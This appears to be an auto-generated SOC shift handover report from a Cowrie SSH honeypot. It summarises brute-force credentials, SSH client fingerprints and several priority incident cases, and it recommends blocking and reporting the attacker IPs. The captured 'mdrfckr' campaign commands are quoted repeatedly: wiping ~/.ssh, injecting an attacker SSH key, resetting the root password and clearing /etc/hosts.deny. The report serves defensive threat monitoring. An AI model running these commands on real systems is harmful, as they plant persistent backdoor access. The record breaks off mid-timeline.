# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T17:27:26Z |
| **Shift Time** | 17:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **145** |
| Confirmed Threats | **131** |
| False Positives Filtered | **14** (9.7%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **12** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **124** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **80** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **50** |
| Unique Passwords | **55** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `345gs5662d34` | 11 |
| `shop1` | 1 |
| `voicemail` | 1 |
| `cjxy` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `123456` | 10 |
| `3245gs5662d34` | 7 |
| `shop1` | 1 |
| `voicemail` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 7 |
| `shop1` | `shop1` | 1 |
| `voicemail` | `voicemail` | 1 |
| `cjxy` | `cjxy123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Csdx@13579` | `118.139.164.171` | 2026-06-13T15:10:11 |
| `root` | `abcd1234.` | `118.139.164.171` | 2026-06-13T15:12:11 |
| `root` | `3245gs5662d34` | `118.139.164.171` | 2026-06-13T15:12:14 |
| `root` | `303` | `118.139.164.171` | 2026-06-13T15:14:14 |
| `root` | `2POv12Pr5n` | `47.107.116.200` | 2026-06-13T15:42:37 |
| `root` | `sgEM4zwptw` | `47.107.116.200` | 2026-06-13T15:42:37 |
| `root` | `123456**` | `194.124.210.127` | 2026-06-13T15:50:05 |
| `root` | `3245gs5662d34` | `194.124.210.127` | 2026-06-13T15:50:36 |
| `root` | `qwe@2026` | `194.124.210.127` | 2026-06-13T15:56:31 |
| `root` | `Qq666666` | `5.178.87.159` | 2026-06-13T15:57:50 |
| `root` | `3245gs5662d34` | `5.178.87.159` | 2026-06-13T15:57:56 |
| `root` | `Password2005` | `194.124.210.127` | 2026-06-13T16:18:38 |
| `root` | `ubuntu` | `120.209.186.110` | 2026-06-13T16:38:49 |
| `root` | `root@2024` | `194.124.210.127` | 2026-06-13T16:49:44 |
| `root` | `qqq123456` | `194.124.210.127` | 2026-06-13T17:06:34 |
| `root` | `p@ssw0rd2024` | `194.124.210.127` | 2026-06-13T17:13:07 |
| `root` | `ankit@123` | `194.124.210.127` | 2026-06-13T17:25:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **145** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 85 |
| Go SSH scanner | 10 |
| OpenSSH | 6 |
| Unknown | 3 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 83 | 6 |
| `0a07365cc01f...` | Generic scanner | 7 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `1b8acd46a07d...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 83 | 6 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 7 | 1 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 6 | 6 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `1b8acd46a07d...` | Unknown | 2 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:4qKCdbPugjkl"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `194.124.210.127`, `118.139.164.171`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `194.124.210.127`, `118.139.164.171`, `5.178.87.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **24** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS50053` | VDSka hosting | 1 | HIGH |
| `AS265719` | ENZO RAUL GALVAN | 1 | LOW |
| `AS136525` | Wancom (Pvt) Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-edf958396969

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-06-13 15:10 |
| **Last Seen** | 2026-06-13 15:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4qKCdbPugjkl"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:10:10` | `cowrie.session.connect` |
| `2026-06-13 15:10:10` | `cowrie.client.version` |
| `2026-06-13 15:10:10` | `cowrie.client.kex` |
| `2026-06-13 15:10:11` | `cowrie.login.success` |
| `2026-06-13 15:10:11` | `cowrie.session.params` |
| `2026-06-13 15:10:11` | `cowrie.command.input` |
| `2026-06-13 15:10:11` | `cowrie.command.failed` |
| `2026-06-13 15:10:11` | `cowrie.log.closed` |
| `2026-06-13 15:10:11` | `cowrie.session.params` |
| `2026-06-13 15:10:11` | `cowrie.command.input` |
| `2026-06-13 15:10:11` | `cowrie.session.file_download` |
| `2026-06-13 15:10:11` | `cowrie.log.closed` |
| `2026-06-13 15:10:21` | `cowrie.session.params` |
| `2026-06-13 15:10:21` | `cowrie.command.input` |
| `2026-06-13 15:10:21` | `cowrie.log.closed` |
| `2026-06-13 15:10:21` | `cowrie.session.params` |
| `2026-06-13 15:10:21` | `cowrie.command.input` |
| `2026-06-13 15:10:21` | `cowrie.log.closed` |
| `2026-06-13 15:10:21` | `cowrie.session.params` |
| `2026-06-13 15:10:21` | `cowrie.command.input` |
| `2026-06-13 15:10:21` | `cowrie.session.file_download` |
| `2026-06-13 15:10:21` | `cowrie.log.closed` |
| `2026-06-13 15:10:21` | `cowrie.session.params` |
| `2026-06-13 15:10:21` | `cowrie.command.input` |
| `2026-06-13 15:10:22` | `cowrie.log.closed` |
| `2026-06-13 15:10:22` | `cowrie.session.params` |
| `2026-06-13 15:10:22` | `cowrie.command.input` |
| `2026-06-13 15:10:22` | `cowrie.log.closed` |
| `2026-06-13 15:10:22` | `cowrie.session.params` |
| `2026-06-13 15:10:22` | `cowrie.command.input` |
| `2026-06-13 15:10:22` | `cowrie.command.input` |
| `2026-06-13 15:10:22` | `cowrie.log.closed` |
| `2026-06-13 15:10:22` | `cowrie.session.params` |
| `2026-06-13 15:10:22` | `cowrie.command.input` |
| `2026-06-13 15:10:22` | `cowrie.log.closed` |
| `2026-06-13 15:10:23` | `cowrie.session.params` |
| `2026-06-13 15:10:23` | `cowrie.command.input` |
| `2026-06-13 15:10:23` | `cowrie.log.closed` |
| `2026-06-13 15:10:23` | `cowrie.session.params` |
| `2026-06-13 15:10:23` | `cowrie.command.input` |
| `2026-06-13 15:10:23` | `cowrie.log.closed` |
| `2026-06-13 15:10:23` | `cowrie.session.params` |
| `2026-06-13 15:10:23` | `cowrie.command.input` |
| `2026-06-13 15:10:23` | `cowrie.log.closed` |
| `2026-06-13 15:10:23` | `cowrie.session.params` |
| `2026-06-13 15:10:23` | `cowrie.command.input` |
| `2026-06-13 15:10:23` | `cowrie.log.closed` |
| `2026-06-13 15:10:24` | `cowrie.session.params` |
| `2026-06-13 15:10:24` | `cowrie.command.input` |
| `2026-06-13 15:10:24` | `cowrie.log.closed` |
| `2026-06-13 15:10:24` | `cowrie.session.params` |
| `2026-06-13 15:10:24` | `cowrie.command.input` |
| `2026-06-13 15:10:24` | `cowrie.log.closed` |
| `2026-06-13 15:10:24` | `cowrie.session.params` |
| `2026-06-13 15:10:24` | `cowrie.command.input` |
| `2026-06-13 15:10:24` | `cowrie.log.closed` |
| `2026-06-13 15:10:24` | `cowrie.session.params` |
| `2026-06-13 15:10:24` | `cowrie.command.input` |
| `2026-06-13 15:10:24` | `cowrie.log.closed` |
| `2026-06-13 15:10:25` | `cowrie.session.params` |
| `2026-06-13 15:10:25` | `cowrie.command.input` |
| `2026-06-13 15:10:25` | `cowrie.log.closed` |
| `2026-06-13 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0739c8df82b

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-06-13 15:12 |
| **Last Seen** | 2026-06-13 15:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:12:11` | `cowrie.session.connect` |
| `2026-06-13 15:12:11` | `cowrie.client.version` |
| `2026-06-13 15:12:11` | `cowrie.client.kex` |
| `2026-06-13 15:12:11` | `cowrie.login.success` |
| `2026-06-13 15:12:11` | `cowrie.session.params` |
| `2026-06-13 15:12:11` | `cowrie.command.input` |
| `2026-06-13 15:12:11` | `cowrie.command.failed` |
| `2026-06-13 15:12:11` | `cowrie.log.closed` |
| `2026-06-13 15:12:11` | `cowrie.session.params` |
| `2026-06-13 15:12:11` | `cowrie.command.input` |
| `2026-06-13 15:12:11` | `cowrie.session.file_download` |
| `2026-06-13 15:12:11` | `cowrie.log.closed` |
| `2026-06-13 15:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433c5cc8c3ed

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-06-13 15:12 |
| **Last Seen** | 2026-06-13 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:12:13` | `cowrie.session.connect` |
| `2026-06-13 15:12:13` | `cowrie.client.version` |
| `2026-06-13 15:12:13` | `cowrie.client.kex` |
| `2026-06-13 15:12:14` | `cowrie.login.success` |
| `2026-06-13 15:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9441ce1523

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-06-13 15:14 |
| **Last Seen** | 2026-06-13 15:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:14:14` | `cowrie.session.connect` |
| `2026-06-13 15:14:14` | `cowrie.client.version` |
| `2026-06-13 15:14:14` | `cowrie.client.kex` |
| `2026-06-13 15:14:14` | `cowrie.login.success` |
| `2026-06-13 15:14:15` | `cowrie.session.params` |
| `2026-06-13 15:14:15` | `cowrie.command.input` |
| `2026-06-13 15:14:15` | `cowrie.command.failed` |
| `2026-06-13 15:14:15` | `cowrie.log.closed` |
| `2026-06-13 15:14:15` | `cowrie.session.params` |
| `2026-06-13 15:14:15` | `cowrie.command.input` |
| `2026-06-13 15:14:15` | `cowrie.session.file_download` |
| `2026-06-13 15:14:15` | `cowrie.log.closed` |
| `2026-06-13 15:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3a8ca9410be

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-06-13 15:14 |
| **Last Seen** | 2026-06-13 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:14:17` | `cowrie.session.connect` |
| `2026-06-13 15:14:17` | `cowrie.client.version` |
| `2026-06-13 15:14:17` | `cowrie.client.kex` |
| `2026-06-13 15:14:17` | `cowrie.login.success` |
| `2026-06-13 15:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03dc7090edd7

| Field | Detail |
|---|---|
| **Source IP** | `47.107.116[.]200` |
| **First Seen** | 2026-06-13 15:42 |
| **Last Seen** | 2026-06-13 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:42:36` | `cowrie.session.connect` |
| `2026-06-13 15:42:36` | `cowrie.client.version` |
| `2026-06-13 15:42:36` | `cowrie.client.kex` |
| `2026-06-13 15:42:37` | `cowrie.login.success` |
| `2026-06-13 15:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.107.116[.]200` to AbuseIPDB if not already reported
- [ ] Block `47.107.116[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c94f3e1872

| Field | Detail |
|---|---|
| **Source IP** | `47.107.116[.]200` |
| **First Seen** | 2026-06-13 15:42 |
| **Last Seen** | 2026-06-13 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:42:36` | `cowrie.session.connect` |
| `2026-06-13 15:42:36` | `cowrie.client.version` |
| `2026-06-13 15:42:36` | `cowrie.client.kex` |
| `2026-06-13 15:42:37` | `cowrie.login.success` |
| `2026-06-13 15:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.107.116[.]200` to AbuseIPDB if not already reported
- [ ] Block `47.107.116[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23100dc292f5

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 15:50 |
| **Last Seen** | 2026-06-13 15:50 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:50:02` | `cowrie.session.connect` |
| `2026-06-13 15:50:02` | `cowrie.client.version` |
| `2026-06-13 15:50:03` | `cowrie.client.kex` |
| `2026-06-13 15:50:05` | `cowrie.login.success` |
| `2026-06-13 15:50:15` | `cowrie.session.params` |
| `2026-06-13 15:50:15` | `cowrie.command.input` |
| `2026-06-13 15:50:15` | `cowrie.command.failed` |
| `2026-06-13 15:50:16` | `cowrie.log.closed` |
| `2026-06-13 15:50:17` | `cowrie.session.params` |
| `2026-06-13 15:50:17` | `cowrie.command.input` |
| `2026-06-13 15:50:21` | `cowrie.session.file_download` |
| `2026-06-13 15:50:21` | `cowrie.log.closed` |
| `2026-06-13 15:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b973ec9b0aa9

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 15:50 |
| **Last Seen** | 2026-06-13 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:50:31` | `cowrie.session.connect` |
| `2026-06-13 15:50:34` | `cowrie.client.version` |
| `2026-06-13 15:50:35` | `cowrie.client.kex` |
| `2026-06-13 15:50:36` | `cowrie.login.success` |
| `2026-06-13 15:50:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-324dc8f5fdd4

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 15:56 |
| **Last Seen** | 2026-06-13 15:57 |
| **Session Duration** | 98s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xBd0Kra4HUKt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:56:18` | `cowrie.session.connect` |
| `2026-06-13 15:56:18` | `cowrie.client.version` |
| `2026-06-13 15:56:19` | `cowrie.client.kex` |
| `2026-06-13 15:56:31` | `cowrie.login.success` |
| `2026-06-13 15:56:38` | `cowrie.session.params` |
| `2026-06-13 15:56:38` | `cowrie.command.input` |
| `2026-06-13 15:56:38` | `cowrie.command.failed` |
| `2026-06-13 15:56:39` | `cowrie.log.closed` |
| `2026-06-13 15:56:41` | `cowrie.session.params` |
| `2026-06-13 15:56:41` | `cowrie.command.input` |
| `2026-06-13 15:56:42` | `cowrie.session.file_download` |
| `2026-06-13 15:56:42` | `cowrie.log.closed` |
| `2026-06-13 15:56:56` | `cowrie.session.params` |
| `2026-06-13 15:56:56` | `cowrie.command.input` |
| `2026-06-13 15:56:57` | `cowrie.log.closed` |
| `2026-06-13 15:56:57` | `cowrie.session.params` |
| `2026-06-13 15:56:57` | `cowrie.command.input` |
